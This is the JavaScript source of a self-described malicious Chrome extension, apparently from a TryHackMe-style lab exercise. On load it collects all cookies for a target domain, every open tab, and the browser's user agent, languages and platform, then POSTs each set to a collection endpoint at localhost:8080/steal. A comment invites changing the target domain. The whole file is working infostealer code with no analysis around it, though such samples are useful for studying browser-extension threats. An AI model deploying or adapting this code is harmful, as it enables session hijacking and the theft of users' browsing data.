async function stealData() {
  // Steal cookies for example.com (change to your target domain)
  chrome.cookies.getAll({ domain: "tryhackme.com" }, (cookies) => {
    console.log("[Malicious extension] Cookies:", cookies);

    fetch("http://localhost:8080/steal", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookies }),
    });
  });

  // Steal open tabs info
  chrome.tabs.query({}, (tabs) => {
    console.log("[Malicious extension] Tabs:", tabs);

    fetch("http://localhost:8080/steal", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tabs }),
    });
  });

  // Steal device info
  let deviceInfo = {
    userAgent: navigator.userAgent,
    languages: navigator.languages,
  };

  if (navigator.userAgentData) {
    deviceInfo.platform = navigator.userAgentData.platform;
  } else {
    // Fallback for older browsers (optional, but may trigger deprecation warning)
    deviceInfo.platform = navigator.platform;
  }

  fetch("http://localhost:8080/steal", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ deviceInfo }),
  });
}

// Run immediately after extension loads
stealData();
